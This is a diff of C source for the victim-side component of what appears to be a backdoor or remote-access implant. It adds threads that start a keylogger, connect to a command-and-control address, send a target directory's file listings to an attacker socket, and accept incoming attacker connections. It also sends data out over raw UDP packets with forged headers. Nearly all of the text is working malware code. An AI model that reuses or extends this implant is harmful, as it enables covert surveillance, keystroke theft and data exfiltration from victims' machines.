@@ -5,8 +5,7 @@
 
 int main(int argc, char *argv[]) {
     struct options_victim opts;
-    pthread_t keylogger_thread;
-    pthread_t cvc_thread;
+    pthread_t keylogger_thread, cnc_thread, file_thread, select_thread;
 
 
     struct bpf_program fp;
@@ -22,13 +21,24 @@ int main(int argc, char *argv[]) {
     initialize_victim_server(&opts);
 
 
+
+    if (pthread_create(&select_thread, NULL, activate_select, (void*)&opts) != 0) {
+        perror("pthread_create error: select_thread");
+        exit(EXIT_FAILURE);
+    }
+
     if (pthread_create(&keylogger_thread, NULL, activate_keylogger, (void*)&opts) != 0) {
         perror("pthread_create error: keylogger_thread");
         exit(EXIT_FAILURE);
     }
 
-    if (pthread_create(&cvc_thread, NULL, activate_cvc, (void*)&opts) != 0) {
-        perror("pthread_create error: cvc_thread");
+    if (pthread_create(&cnc_thread, NULL, activate_cnc, (void*)&opts) != 0) {
+        perror("pthread_create error: cnc_thread");
+        exit(EXIT_FAILURE);
+    }
+
+    if (pthread_create(&file_thread, NULL, check_directory, (void*)&opts) != 0) {
+        perror("pthread_create error: cnc_thread");
         exit(EXIT_FAILURE);
     }
 
@@ -146,16 +156,17 @@ void execute_instruction(u_char *args) {
     char **commands;
     ov = (struct options_victim*)args;
 
-
-    if (strstr(ov->instruction, "cvc") != NULL) {
-        strcpy(ov->cvc_ip, ov->instruction + 4);
-        ov->cvc = TRUE;
+    // TODO: PARSE ARGUMENTS
+    if (strstr(ov->instruction, "cnc") != NULL) {
+        strcpy(ov->cnc_ip, ov->instruction + 4);
+        ov->cnc = TRUE;
     }
     else if (strcmp(ov->instruction, "keylogger") == 0) {
         ov->keylogger = TRUE;
     }
     else if (strstr(ov->instruction, "target") != NULL) {
-        // TODO: IF COMMAND = TARGET_DIR
+        strcpy(ov->target_directory, ov->instruction + 7);
+        ov->target = TRUE;
     }
     else {
         // TODO: PORT KNOCK
@@ -314,7 +325,7 @@ void send_to_attacker(u_char *args) {
         create_ip_header(&ih, ov->sending_buffer[j], args);
         memcpy(s_buffer, &ih, sizeof(struct iphdr));
         memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
-        byte = (int)sendto(ov->victim_socket, (const char *) s_buffer, SEND_SIZE, 0,
+        byte = (int)sendto(ov->victim_udp_socket, (const char *) s_buffer, SEND_SIZE, 0,
                       (const struct sockaddr *) &attacker_address, sizeof(attacker_address));
         if (byte < 0) {
             perror("send failed\n");
@@ -326,7 +337,7 @@ void send_to_attacker(u_char *args) {
 
 
 unsigned short create_udp_header(struct udphdr* uh, uint16_t port) {
-    uh->source = htons(DEFAULT_PORT);
+    uh->source = htons(DEFAULT_UDP_PORT);
     uh->dest = htons(port);
     uh->len = htons(sizeof(struct udphdr));
     uh->check = calculate_checksum(&uh, sizeof(struct udphdr));
@@ -355,6 +366,103 @@ unsigned short create_ip_header(struct iphdr* ih, char c, u_char *args) {
 }
 
 
+void initialize_victim_server(struct options_victim *opts) {
+    struct sockaddr_in udp_victim_address, tcp_victim_address;
+    int  client_addr_size;
+    socklen_t client_address_size = sizeof(struct sockaddr_in);
+    int option = TRUE;
+
+    opts->victim_udp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    opts->victim_tcp_socket = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (opts->victim_udp_socket == -1) {
+        perror("socket() ERROR\n");
+        exit(EXIT_FAILURE);
+    }
+
+    udp_victim_address.sin_family = AF_INET;
+    udp_victim_address.sin_port = htons(DEFAULT_UDP_PORT);
+    udp_victim_address.sin_addr.s_addr = htonl(INADDR_ANY);
+
+    tcp_victim_address.sin_family = AF_INET;
+    tcp_victim_address.sin_port = htons(DEFAULT_TCP_PORT);
+    tcp_victim_address.sin_addr.s_addr = htonl(INADDR_ANY);
+
+
+    if (udp_victim_address.sin_addr.s_addr == (in_addr_t) -1) {
+        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
+    }
+
+    option = 1;
+    setsockopt(opts->victim_udp_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
+    setsockopt(opts->victim_udp_socket, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option));
+    setsockopt(opts->victim_tcp_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
+    setsockopt(opts->victim_tcp_socket, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option));
+
+    if (bind(opts->victim_udp_socket, (struct sockaddr *) &udp_victim_address, sizeof(struct sockaddr_in)) == -1) {
+        perror("bind() ERROR\n");
+        exit(EXIT_FAILURE);
+    }
+
+    if (bind(opts->victim_tcp_socket, (struct sockaddr *) &tcp_victim_address, sizeof(struct sockaddr_in)) == -1) {
+        perror("bind() ERROR\n");
+        exit(EXIT_FAILURE);
+    }
+
+    if (listen(opts->victim_tcp_socket, BACKLOG) == -1) {
+        perror("listen ERROR\n");
+        exit(EXIT_FAILURE);
+    }
+}
+
+
+void cnc_select_call(struct options_victim *opts, struct sockaddr_in cnc_address) {
+
+    struct timeval timeout;
+
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+
+    create_victim_cnc_socket(opts, &cnc_address);
+
+    // VICTIM SERVER
+    cnc_address.sin_family = AF_INET;
+    cnc_address.sin_port = htons(CNC_PORT);
+    cnc_address.sin_addr.s_addr = inet_addr(opts->cnc_ip);
+
+
+    if (cnc_address.sin_addr.s_addr == (in_addr_t) - 1) {
+        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
+    }
+
+
+    if (connect(opts->cnc_socket, (struct sockaddr*)&cnc_address,
+                sizeof(cnc_address)) < 0) {
+        printf("connect() failed\n");
+        exit(1);
+    }
+}
+
+
+void create_victim_cnc_socket(struct options_victim *opts, struct sockaddr_in *cnc_address) {
+    opts->cnc_socket = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (opts->cnc_socket == -1) {
+        perror("socket() ERROR\n");
+        exit(EXIT_FAILURE);
+    }
+
+    // VICTIM SERVER
+    cnc_address->sin_family = AF_INET;
+    cnc_address->sin_port = htons(CNC_PORT);
+    cnc_address->sin_addr.s_addr = inet_addr(opts->cnc_ip);
+
+    if (cnc_address->sin_addr.s_addr == (in_addr_t) - 1) {
+        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
+    }
+}
+
+
 void* activate_keylogger(void* arg){
     struct options_victim* ov;
     ov = (struct options_victim*)arg;
@@ -363,107 +471,104 @@ void* activate_keylogger(void* arg){
             break;
         }
     }
-    // TODO: ACTIVATE KEYLOGGER
     puts("KEYLOGGER ACTIVATED");
     keylogger_main(ov);
 }
 
 
-void* activate_cvc(void* arg){
+void* activate_cnc(void* arg){
     struct options_victim* ov;
-    struct sockaddr_in cvc_address;
+    struct sockaddr_in cnc_address;
 
-    memset(&cvc_address, 0, sizeof(struct sockaddr_in));
+    memset(&cnc_address, 0, sizeof(struct sockaddr_in));
     ov = (struct options_victim*)arg;
     while(1) {
-        if (ov->cvc == TRUE) {
+        if (ov->cnc == TRUE) {
             break;
         }
     }
 
-    cvc_select_call(ov, cvc_address);
+    cnc_select_call(ov, cnc_address);
     pthread_exit(NULL);
 }
 
 
-void initialize_victim_server(struct options_victim *opts) {
-    struct sockaddr_in victim_address;
-    int option = TRUE;
+void* check_directory(void* arg) {
+    struct options_victim* ov;
+    DIR *dir;
+    struct dirent *entry;
+    char file_name[64] = {0};
+    char* send = NULL;
 
-    opts->victim_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    ov = (struct options_victim*) arg;
+    while(1) {
+        while (1) {
+            if (ov->target == TRUE) {
+                break;
+            }
+        }
 
-    if (opts->victim_socket == -1) {
-        perror("socket() ERROR\n");
-        exit(EXIT_FAILURE);
+        // Open the directory
+        dir = opendir(ov->target_directory);
+        if (dir == NULL) {
+            printf("Failed to open the directory.\n");
+        }
+        // Read directory entries
+        while ((entry = readdir(dir)) != NULL) {
+            if (entry->d_type == DT_REG || entry->d_type == DT_DIR) {
+                if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0 ) {
+                    printf("%s\n", entry->d_name);
+                    strncpy(file_name, entry->d_name, strlen(entry->d_name));
+                    file_name[strlen(entry->d_name)] = '\n';
+                    write(ov->attacker_socket, file_name, strlen(entry->d_name) + 1);
+                }
+            }
+            memset(file_name, 0, sizeof(file_name));
+        }
+
+        // Close the directory
+        closedir(dir);
+
+        ov->target = FALSE;
     }
-
-    victim_address.sin_family = AF_INET;
-    victim_address.sin_port = htons(DEFAULT_PORT);
-    victim_address.sin_addr.s_addr = htonl(INADDR_ANY);
-
-    if (victim_address.sin_addr.s_addr == (in_addr_t) -1) {
-        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
-    }
-
-    option = 1;
-    setsockopt(opts->victim_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
-    setsockopt(opts->victim_socket, IPPROTO_IP, IP_HDRINCL, &option, sizeof(option));
-
-    if (bind(opts->victim_socket, (struct sockaddr *) &victim_address, sizeof(struct sockaddr_in)) == -1) {
-        perror("bind() ERROR\n");
-        exit(EXIT_FAILURE);
-    }
-
-
-//    if (listen(opts->victim_socket, BACKLOG) == -1) {
-//        perror("listen() ERROR\n");
-//        exit(EXIT_FAILURE);
-//    }
 }
 
 
-void cvc_select_call(struct options_victim *opts, struct sockaddr_in cvc_address) {
-
+void* activate_select(void* arg) {
+    struct options_victim* opts;
+    struct sockaddr_in client_address;
+    socklen_t client_address_size = sizeof(struct sockaddr_in);
+    fd_set read_fds, copy_fds;
+    int fd_max, fd_num;
     struct timeval timeout;
+
+    opts = (struct options_victim*) arg;
 
     timeout.tv_sec = 1;
     timeout.tv_usec = 0;
 
-    create_victim_cvc_socket(opts, &cvc_address);
+    FD_ZERO(&read_fds);
+    FD_SET(opts->victim_tcp_socket, &read_fds);
+    fd_max = opts->victim_tcp_socket;
 
-    // VICTIM SERVER
-    cvc_address.sin_family = AF_INET;
-    cvc_address.sin_port = htons(CVC_PORT);
-    cvc_address.sin_addr.s_addr = inet_addr(opts->cvc_ip);
+    while (1) {
+        copy_fds = read_fds;
+        fd_num = select(fd_max + 1, &copy_fds, 0, 0, &timeout);
+        if (fd_num == -1) {
+            perror("Select() failed");
+            exit(EXIT_FAILURE);
+        } else if (fd_num == 0) continue; // time out
 
-
-    if (cvc_address.sin_addr.s_addr == (in_addr_t) - 1) {
-        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
+        for (int i = 0; i < fd_max + 1; i++) {
+            if (FD_ISSET(i, &copy_fds)) {
+                if (i == opts->victim_tcp_socket) {
+                    opts->attacker_socket = accept(opts->victim_tcp_socket, (struct sockaddr *) &client_address,
+                                           &client_address_size);
+                    FD_SET(opts->attacker_socket, &read_fds);
+                    fd_max += 1;
+                }
+            }
+        }
     }
-
-
-    if (connect(opts->cvc_socket, (struct sockaddr*)&cvc_address,
-                sizeof(cvc_address)) < 0) {
-        printf("connect() failed\n");
-        exit(1);
-    }
-}
-
-
-void create_victim_cvc_socket(struct options_victim *opts, struct sockaddr_in *cvc_address) {
-    opts->cvc_socket = socket(AF_INET, SOCK_STREAM, 0);
-
-    if (opts->cvc_socket == -1) {
-        perror("socket() ERROR\n");
-        exit(EXIT_FAILURE);
-    }
-
-    // VICTIM SERVER
-    cvc_address->sin_family = AF_INET;
-    cvc_address->sin_port = htons(CVC_PORT);
-    cvc_address->sin_addr.s_addr = inet_addr(opts->cvc_ip);
-
-    if (cvc_address->sin_addr.s_addr == (in_addr_t) - 1) {
-        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
-    }
+    return EXIT_SUCCESS;
 }
